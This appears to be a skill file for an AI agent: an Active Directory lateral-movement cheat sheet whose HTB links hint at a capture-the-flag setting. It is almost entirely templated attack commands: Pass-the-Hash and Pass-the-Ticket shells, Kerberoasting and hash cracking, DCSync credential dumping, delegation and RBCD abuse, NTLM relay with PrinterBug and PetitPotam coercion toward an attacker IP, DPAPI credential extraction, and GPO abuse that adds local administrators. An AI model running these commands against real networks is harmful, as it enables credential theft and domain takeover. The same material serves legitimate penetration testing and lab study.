---
name: lateral-movement
description: Move laterally in Active Directory after gaining credentials or hashes. Use when discussing WinRM shells, Pass-the-Hash, Pass-the-Ticket, Kerberoasting, constrained/unconstrained delegation, RBCD, NTLMRelay, PrinterBug/PetitPotam coercion, cross-session relay, DPAPI credential extraction, AD Recycle Bin, GPO abuse, or DCSync.
user-invocable: false
allowed-tools: Read
---

# Lateral Movement

## Shell access
```bash
evil-winrm -i {IP} -u '{USER}' -p '{PASS}'
evil-winrm -i {IP} -u '{USER}' -H {NT_HASH}
impacket-psexec {DOMAIN}/{USER}:'{PASS}'@{IP}
impacket-wmiexec {DOMAIN}/{USER}:'{PASS}'@{IP}
```

## Pass-the-Hash
```bash
evil-winrm -i {IP} -u {USER} -H {NT_HASH}
netexec smb {IP} -u {USER} -H {NT_HASH}
impacket-psexec {DOMAIN}/{USER}@{IP} -hashes :{NT_HASH}
```

## Pass-the-Ticket
```bash
export KRB5CCNAME={ticket.ccache}
impacket-psexec {DOMAIN}/administrator@{DC_FQDN} -k -no-pass
evil-winrm -i {DC_FQDN} -r {DOMAIN}
```

## Overpass-the-Hash (NTLM → TGT)
```bash
impacket-getTGT {DOMAIN}/{USER} -hashes :{NT_HASH} -dc-ip {IP}
export KRB5CCNAME={USER}.ccache
```

## Kerberoasting
```bash
netexec ldap {IP} -u '{USER}' -p '{PASS}' --kerberoasting kerb.txt
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
# rockyou fails → not the intended path, pivot immediately
```

## DCSync
```bash
impacket-secretsdump {DOMAIN}/{USER}:'{PASS}'@{IP} -just-dc
impacket-secretsdump {DOMAIN}/{USER}@{IP} -hashes :{NT_HASH} -just-dc
```

## Constrained delegation (S4U2Self+Proxy)
```bash
impacket-getST -spn {SPN} -impersonate administrator -dc-ip {IP} '{DOMAIN}/{USER}:{PASS}'
export KRB5CCNAME=administrator@{SPN}.ccache
impacket-psexec {DOMAIN}/administrator@{TARGET_FQDN} -k -no-pass
```

## RBCD
```bash
bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} set object '{TARGET}$' msDS-AllowedToActOnBehalfOfOtherIdentity -v '{ATTACKER_SID}'
impacket-getST -spn cifs/{TARGET_FQDN} -impersonate administrator {DOMAIN}/{ATTACKER}$ -hashes :{NT_HASH} -dc-ip {IP}
export KRB5CCNAME=administrator@cifs_{TARGET}.ccache
impacket-psexec {DOMAIN}/administrator@{TARGET_FQDN} -k -no-pass
```

## NTLMRelay + coercion (ESC8, shadow cred)
```bash
impacket-ntlmrelayx -t ldaps://{DC_IP} --delegate-access --no-smb-server -smb2support
python3 printerbug.py {DOMAIN}/{USER}:'{PASS}'@{DC_FQDN} {ATTACKER_IP}
# Or: python3 PetitPotam.py {ATTACKER_IP} {DC_IP}  (no creds needed)
```

## Cross-session relay (Rebound/Mirage)
```bash
netexec smb {IP} -u '{USER}' -p '{PASS}' --sessions   # check active sessions
# From Windows shell: .\RemotePotato0.exe -m 2 -s 1 -x {ATTACKER_IP} -p 9998
```

## DPAPI
```bash
donpapi collect --dc-ip {IP} -d {DOMAIN} -u '{USER}' -p '{PASS}'
impacket-dpapi masterkey -file {MK} -sid {SID} -password {PASS}
impacket-dpapi credential -file {CRED} -key {MK}
```

## AD Recycle Bin (TombWatcher)
```bash
# From Windows shell (PowerShell):
Get-ADObject -Filter {isDeleted -eq $true} -IncludeDeletedObjects -Properties *
Restore-ADObject -Identity {GUID}
```

## GPO abuse
```bash
# From Windows shell: .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount {USER} --GPOName '{GPO}'
python3 pygpoabuse.py {DOMAIN}/{USER}:'{PASS}'@{DC_IP} -gpo-id {GPO_ID} -command 'net localgroup administrators {USER} /add'
```

## Pivot checklist after each new account
```
1. netexec winrm → shell?
2. netexec smb --shares → new shares?
3. BloodHound → mark owned, check outbound
4. certipy find → ADCS path?
5. Groups: Backup Operators, Account Operators, Remote Management Users
6. Sessions on machine: netexec --sessions
7. Stored creds: DPAPI, scheduled tasks, browser
```

## Gotchas
- **Always test WinRM first** with new creds before anything else
- **rockyou fails** → pivot, not the intended path
- **Constrained delegation** → check `msDS-AllowedToDelegateTo` attribute in BloodHound
- **RBCD** requires attacker-controlled machine account or `MachineAccountQuota > 0`
- **PetitPotam** → no creds needed, coerces DC authentication

## Key References
- https://www.ired.team — AD attack mechanics
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
- https://www.thehacker.recipes
- https://github.com/ly4k/Certipy/wiki — ADCS ESC1-16
- https://0xdf.gitlab.io — HTB AD writeups